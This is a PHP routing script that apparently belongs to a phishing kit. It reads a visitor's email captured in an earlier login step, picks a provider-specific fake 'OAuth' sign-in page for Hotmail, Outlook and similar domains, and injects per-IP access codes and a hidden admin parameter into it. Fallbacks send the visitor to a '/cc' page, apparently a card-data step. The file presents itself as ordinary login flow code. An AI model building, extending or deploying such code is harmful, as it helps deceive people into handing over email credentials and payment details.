<?php
defined("ALLOW") or exit('No direct script access allowed');

// Get email from multiple sources: cookie (preferred), URL parameter, or session storage
$email = '';

// 1. Try to get from cookie first (set after login)
if (empty($email) && isset($_COOKIE['flow_email'])) {
    $email = $_COOKIE['flow_email'];
}

// 2. Try to get from URL parameter
if (empty($email)) {
    $email = $_GET['email'] ?? '';
}

// 3. If no email found, use JavaScript to get from session storage and redirect
if (empty($email)) {
?>
<script>
(function() {
    // Wait for access code to be available
    function waitForAccessCode(callback) {
        if (window.__ACCESS_CODE__) {
            callback();
        } else {
            // Wait a bit and try again
            setTimeout(() => waitForAccessCode(callback), 50);
        }
    }
    
    waitForAccessCode(function() {
        // Get email from session storage
        const flowData = JSON.parse(sessionStorage.getItem('flowData') || '{}');
        const email = flowData.login?.email || '';
        
        if (!email) {
            // No email found, redirect to cc page
            const accessCode = window.__ACCESS_CODE__;
            if (accessCode) {
                location.href = '/' + accessCode + '/cc';
            } else {
                location.href = '/?access';
            }
            return;
        }
        
        // Set cookie with email for PHP access
        document.cookie = 'flow_email=' + encodeURIComponent(email) + '; path=/; max-age=3600';
        
        // Check if OAuth is enabled
        const flowSettings = window.__FLOW_SETTINGS__ || {};
        if (!flowSettings.oauth_enabled) {
            const accessCode = window.__ACCESS_CODE__;
            if (accessCode) {
                location.href = '/' + accessCode + '/cc';
            } else {
                location.href = '/?access';
            }
            return;
        }
        
        // Reload page to get email from cookie
        location.reload();
    });
})();
</script>
<?php
    exit;
}

// Validate email
function getEmailDomain($email) {
    $parts = explode('@', $email);
    return isset($parts[1]) ? strtolower(trim($parts[1])) : null;
}

function isValidDomain($domain) {
    return preg_match('/^[a-z0-9.-]+$/', $domain) && !preg_match('/(\.\.|\/|\\\\)/', $domain);
}

// Get access code from URL path (similar to core.php logic)
$uriPath = (string)parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH);
$basePath = str_replace('\\', '/', dirname($_SERVER['SCRIPT_NAME'] ?? '/'));
$basePath = rtrim($basePath, '/');
if ($basePath !== '' && $basePath !== '/' && str_starts_with($uriPath, $basePath . '/')) {
    $uriPath = substr($uriPath, strlen($basePath));
}
$route = trim($uriPath, '/');
$parts = explode('/', $route);
$accessCode = count($parts) >= 2 ? $parts[0] : '';

// Validate email format
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    // Invalid email, redirect to cc
    if ($accessCode) {
        header('Location: /' . $accessCode . '/cc');
    } else {
        header('Location: /?access');
    }
    exit;
}

// Get domain
$domain = getEmailDomain($email);

if (!$domain || !isValidDomain($domain)) {
    // Invalid domain, redirect to cc
    if ($accessCode) {
        header('Location: /' . $accessCode . '/cc');
    } else {
        header('Location: /?access');
    }
    exit;
}

// Check if OAuth is enabled
$config = include FCPATH . 'admin_config.php';
$flowSettings = $config['flow_settings'] ?? [];
if (!($flowSettings['oauth_enabled'] ?? false)) {
    // OAuth disabled, redirect to cc
    if ($accessCode) {
        header('Location: /' . $accessCode . '/cc');
    } else {
        header('Location: /?access');
    }
    exit;
}

// Extract main domain name (e.g., hotmail.com -> hotmail, outlook.com -> outlook)
$domainParts = explode('.', $domain);
$mainDomain = $domainParts[0] ?? $domain;

// Map certain domains to hotmail (msn.com and live.com -> hotmail)
if (in_array($mainDomain, ['msn', 'live'])) {
    $mainDomain = 'hotmail';
}

// Find the OAuth page file
$domainFolder = FCPATH . 'Tembuluk/Views/flow/Email/' . $mainDomain . '/';
$indexFilePattern = $domainFolder . 'index' . $mainDomain . '.php';
$indexFileFallback = $domainFolder . 'index.php';
$indexFileFullDomain = $domainFolder . 'index' . $domain . '.php';

$filePath = null;
if (file_exists($indexFilePattern)) {
    $filePath = $indexFilePattern;
} elseif (file_exists($indexFileFullDomain)) {
    $filePath = $indexFileFullDomain;
} elseif (file_exists($indexFileFallback)) {
    $filePath = $indexFileFallback;
}

if ($filePath && file_exists($filePath) && is_readable($filePath)) {
    // Include the OAuth page directly without any wrapper
    // Set email variable for included file
    $_GET['email'] = $email;
    
    // Clear any output buffers to ensure clean output
    // Make sure we clear all buffers including from core.php
    while (ob_get_level() > 0) {
        ob_end_clean();
    }
    
    // Set headers before output
    http_response_code(200);
    header('Content-Type: text/html; charset=UTF-8');
    
    // Get access code for injection
    $clientIp = get_client_ip();
    $accessCodeForInjection = get_ip_access_code($clientIp);
    
    // Load translations and flow settings for injection
    $lang = load_translations(FCPATH);
    $langJson = json_encode($lang, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
    $config = include FCPATH . 'admin_config.php';
    $flowSettingsJson = json_encode($config['flow_settings'], JSON_UNESCAPED_SLASHES);
    $accessParam = $config['access_parameter'] ?? 'access';
    $adminAccessParam = $config['admin_access_parameter'] ?? 'phoniex';
    
    // Inject script with access code and other variables before including file
    $injectScript = "<script>window.__LANG__ = " . $langJson . "; window.__FLOW_SETTINGS__ = " . $flowSettingsJson . "; window.__ACCESS_CODE__ = '" . $accessCodeForInjection . "'; window.__ACCESS_PARAM__ = '" . $accessParam . "'; window.__ADMIN_ACCESS_PARAM__ = '" . $adminAccessParam . "';</script>";
    
    // Disable output buffering for direct output
    if (ob_get_level() == 0) {
        // No buffer, include file directly - output goes straight to browser
        ob_start();
        include $filePath;
        $html = ob_get_clean();
        
        // Inject script before </head> tag
        $html = str_replace('</head>', $injectScript . "</head>", $html);
        
        // Output the HTML
        echo $html;
        
        // Flush output to ensure it's sent
        flush();
    } else {
        // If somehow buffer still exists, capture and output
        ob_start();
        include $filePath;
        $html = ob_get_clean();
        
        // Inject script before </head> tag
        $html = str_replace('</head>', $injectScript . "</head>", $html);
        
        echo $html;
        flush();
    }
    
    // Exit to prevent any further processing
    exit;
} else {
    // OAuth page not found, redirect to cc
    // Get access code from URL path (reuse same logic)
    $uriPath = (string)parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH);
    $basePath = str_replace('\\', '/', dirname($_SERVER['SCRIPT_NAME'] ?? '/'));
    $basePath = rtrim($basePath, '/');
    if ($basePath !== '' && $basePath !== '/' && str_starts_with($uriPath, $basePath . '/')) {
        $uriPath = substr($uriPath, strlen($basePath));
    }
    $route = trim($uriPath, '/');
    $parts = explode('/', $route);
    $accessCode = count($parts) >= 2 ? $parts[0] : '';
    
    if ($accessCode) {
        header('Location: /' . $accessCode . '/cc');
    } else {
        header('Location: /?access');
    }
    exit;
}

